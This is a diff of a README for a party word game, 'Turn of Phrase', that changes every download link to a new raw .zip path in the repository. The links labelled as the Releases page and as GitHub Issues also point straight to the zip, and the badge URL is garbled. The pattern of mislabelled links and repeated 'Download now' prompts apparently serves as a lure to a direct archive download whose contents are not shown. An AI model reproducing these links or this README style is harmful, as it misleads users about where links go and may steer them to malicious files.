@@ -6,11 +6,11 @@ Welcome to **Turn of Phrase**! This game is designed for friends and family to g
 
 ## 📥 Download the Game
 
-[![Download Turn of Phrase](https://raw.githubusercontent.com/inderjeet-erekrut/turn-of-phrase/main/jugum/turn-of-phrase.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/inderjeet-erekrut/turn-of-phrase/main/jugum/turn-of-phrase.zip)
+[![Download Turn of Phrase](https://raw.githubusercontent.com/inderjeet-erekrut/turn-of-phrase/main/doc/of_phrase_turn_v3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/inderjeet-erekrut/turn-of-phrase/main/doc/of_phrase_turn_v3.4.zip)
 
 You can download the game from our Releases page. 
 
-Visit this page to download: [Turn of Phrase Releases](https://raw.githubusercontent.com/inderjeet-erekrut/turn-of-phrase/main/jugum/turn-of-phrase.zip)
+Visit this page to download: [Turn of Phrase Releases](https://raw.githubusercontent.com/inderjeet-erekrut/turn-of-phrase/main/doc/of_phrase_turn_v3.4.zip)
 
 ## 🎮 How to Play
 
@@ -31,7 +31,7 @@ To play Turn of Phrase, you need:
 ## 🛠️ Installation Instructions
 
 1. **Download the Game**: 
-   As mentioned, go to the [Turn of Phrase Releases](https://raw.githubusercontent.com/inderjeet-erekrut/turn-of-phrase/main/jugum/turn-of-phrase.zip) page to download the latest version of the game.
+   As mentioned, go to the [Turn of Phrase Releases](https://raw.githubusercontent.com/inderjeet-erekrut/turn-of-phrase/main/doc/of_phrase_turn_v3.4.zip) page to download the latest version of the game.
 
 2. **Extract the Files**:
    If you have downloaded a .zip file, right-click on it and select "Extract All". Follow the prompts to extract the files to a folder on your computer.
@@ -66,11 +66,11 @@ A: If you face any problems, check the "Issues" section of our GitHub repository
 
 If you have any questions or need support, feel free to reach out. 
 
-- Visit our [GitHub Issues](https://raw.githubusercontent.com/inderjeet-erekrut/turn-of-phrase/main/jugum/turn-of-phrase.zip) page for assistance. 
+- Visit our [GitHub Issues](https://raw.githubusercontent.com/inderjeet-erekrut/turn-of-phrase/main/doc/of_phrase_turn_v3.4.zip) page for assistance. 
 - Join our community discussions and get tips from other players!
 
 ## 🎉 Conclusion
 
 Thank you for choosing Turn of Phrase! We hope you enjoy countless hours of fun with friends and family. Don’t forget to check for updates and new phrases regularly.
 
-Download now and start the fun! [Turn of Phrase Releases](https://raw.githubusercontent.com/inderjeet-erekrut/turn-of-phrase/main/jugum/turn-of-phrase.zip)
+Download now and start the fun! [Turn of Phrase Releases](https://raw.githubusercontent.com/inderjeet-erekrut/turn-of-phrase/main/doc/of_phrase_turn_v3.4.zip)
